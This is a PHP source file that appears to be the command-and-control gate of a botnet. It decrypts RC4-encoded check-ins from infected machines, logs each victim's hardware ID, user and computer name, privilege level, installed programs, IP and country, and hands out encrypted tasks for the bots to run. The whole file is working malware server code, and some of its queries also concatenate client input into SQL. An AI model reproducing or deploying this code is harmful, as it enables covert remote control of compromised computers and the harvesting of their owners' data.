<?php
include 'include/config.php';
include 'include/rc4.php';
include 'include/geo.php';

function decryptClient($rc4Key, $info)
{
    foreach ($info as $key => $value) { if($key != "fp") { $info[$key] = rc4($rc4Key, base64_decode($value)); } }
    if(isset($info["fp"])) 
    { 
        foreach ($info["fp"] as &$value) { $value = rc4($rc4Key, base64_decode($value)); } 
        $info["fp"] = serialize($info["fp"]);
    }
    if ($info["check"] != "check") {  return "error"; }
    else 
    {
        $keys =  array("bn" => "buildName", "bt" => "buildType", "bu" => "buildVersion",
                    "ca" => "cpuArchitecture", "cc" => "cpuCores", "cn" => "computerName",
                    "cp" => "cpu", "gp" => "gpu", "hw" => "hwid",
                    "ip" => "installPath", "os" => "operatingSystem", "pr" => "privilege",
                    "ra" => "ram", "un" => "userName", "vr" => "vram",
                    "fp" => "foundPrograms", "ct" => "compleateTask", "st" => "taskStatus");
        foreach ($keys as $key => $value)
        {
            foreach ($info as $iKey => $iValue)
            {
                if ($iKey == $key)
                {
                    $info[$value] = $info[$iKey];
                    unset($info[$iKey]);
                }
            }
        }
        $info['ipAddr'] = $_SERVER['REMOTE_ADDR'];
        $info['country'] = ip_info($info['ipAddr'], "Country Code");
        if (empty($info["country"])) { $info["country"] = "RU"; }
        return $info; 
    }
}

$gate = $odb->query("SELECT gate_status FROM settings LIMIT 1")->fetchColumn(0);
if ($gate == 1)
{
    $clientInfo = decryptClient($rc4Key, json_decode(base64_decode($_POST['request']), true));
    if($clientInfo != "error")
    {
        $exs = $odb->prepare("SELECT COUNT(*) FROM clients WHERE hwid = :h");
        $exs->execute(array(":h" => $clientInfo['hwid']));
        if ($exs->fetchColumn(0) == "0")
        {
            $i = $odb->prepare("INSERT INTO clients (id, hwid, buildName, buildType, buildVersion, cpuArchitecture, cpuCores, computerName, cpu, gpu, installPath, operatingSystem, privilege, ram, userName, vram, ipAddr, country, foundPrograms, installDate, lastKnock, currentTask, mark) VALUES(NULL, :hwid, :buildName, :buildType, :buildVersion, :cpuArchitecture, :cpuCores, :computerName, :cpu, :gpu, :installPath, :operatingSystem, :privilege, :ram, :userName, :vram, :ipAddr, :country, :foundPrograms, UNIX_TIMESTAMP(), UNIX_TIMESTAMP(), :currentTask, :mark)");
            $i->execute(array(":hwid" => $clientInfo["hwid"], ":buildName" => $clientInfo["buildName"],
                                ":buildType" => $clientInfo["buildType"], ":buildVersion" => $clientInfo["buildVersion"],
                                ":cpuArchitecture" => $clientInfo["cpuArchitecture"], ":cpuCores" => $clientInfo["cpuCores"],
                                ":computerName" => $clientInfo["computerName"], ":cpu" => $clientInfo["cpu"],
                                ":gpu" => $clientInfo["gpu"], ":installPath" => $clientInfo["installPath"],
                                ":operatingSystem" => $clientInfo["operatingSystem"], ":privilege" => $clientInfo["privilege"],
                                ":ram" => $clientInfo["ram"], ":userName" => $clientInfo["userName"],
                                ":vram" => $clientInfo["vram"], ":ipAddr" => $clientInfo["ipAddr"],
                                "country" => $clientInfo["country"], ":foundPrograms" => $clientInfo["foundPrograms"],
                                ":currentTask" => "N/A", ":mark" => "1"));
        }
        else
        {
            $u = $odb->prepare("UPDATE clients SET lastKnock = UNIX_TIMESTAMP(), buildVersion = :buildVersion, installPath = :installPath, privilege = :privilege WHERE hwid = :h");
            $u->execute(array(":buildVersion" => $clientInfo["buildVersion"], ":installPath" => $clientInfo["installPath"], ":privilege" => $clientInfo["privilege"], ":h" => $clientInfo["hwid"]));
        }
        /////////////////////////////////////////////////////Incomplete Task Managment////////////////////////////////////////////////////////////////

        if (isset($clientInfo['compleateTask']) && $clientInfo['compleateTask'] != "N/A" )
        {
            if($clientInfo['taskStatus'] == "Success")
            {
                $insert = $odb->prepare("INSERT INTO c_tasks VALUES(NULL, :taskId, :hwid)");
                $insert->execute(array(":taskId" => $clientInfo['compleateTask'], ":hwid" => $clientInfo['hwid']));
                $update = $odb->prepare("UPDATE tasks SET compleated = compleated + 1 WHERE taskId = :tid");
                $update->execute(array(":tid" => $clientInfo['compleateTask']));
            }
            else
            {
                $insert = $odb->prepare("INSERT INTO f_tasks VALUES(NULL, :taskId, :hwid)");
                $insert->execute(array(":taskId" => $clientInfo['compleateTask'], ":hwid" => $clientInfo['hwid']));
                $update = $odb->prepare("UPDATE tasks SET failed = failed + 1 WHERE taskId = :tid");
                $update->execute(array(":tid" => $clientInfo['compleateTask']));
            }
        }

        $tasks = $odb->query("SELECT * FROM tasks ORDER BY id");
        $clientMark = $odb->query("SELECT mark FROM clients WHERE hwid = \"".$clientInfo['hwid']."\"")->fetchColumn(0);
        while ($task = $tasks->fetch(PDO::FETCH_ASSOC))
        {
            if ($task['status'] == "1" && $clientMark == "1")
            {
                $executions = $odb->query("SELECT COUNT(*) FROM c_tasks WHERE taskId = '".$task['taskId']."'")->fetchColumn(0);
                if ($executions == $task['total']) 
                {   
                    $update = $odb->prepare("UPDATE tasks SET status = '2' WHERE taskId = :tid");
                    $update->execute(array(":tid" => $task['taskId']));
                    continue; 
                }
                else
                {
                    $isDone = $odb->prepare("SELECT COUNT(*) FROM c_tasks WHERE taskId = :i AND hwid = :h");
                    $isDone->execute(array(":i" => $task['taskId'], ":h" => $clientInfo['hwid']));
                    if ($isDone->fetchColumn(0) == 0)
                    {
                        $responce = array("task" => $task['task'], 
                        "taskId" => $task['taskId'], 
                        "taskParm" => $task['parameters']);
                        foreach ($responce as $key => $value)
                        { 
                            $responce[$key] = base64_encode(rc4($rc4Key, $value)); 
                        }
        
                        $responce = base64_encode(json_encode($responce));
                        print_r($responce);
                        die();
                    }
                }
            }
        }
        $responce = array("task" => "N/A");
        foreach ($responce as $key => $value)
        { 
            $responce[$key] = base64_encode(rc4($rc4Key, $value)); 
        }

        $responce = base64_encode(json_encode($responce));
        print_r($responce);
        //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    } 
}
?>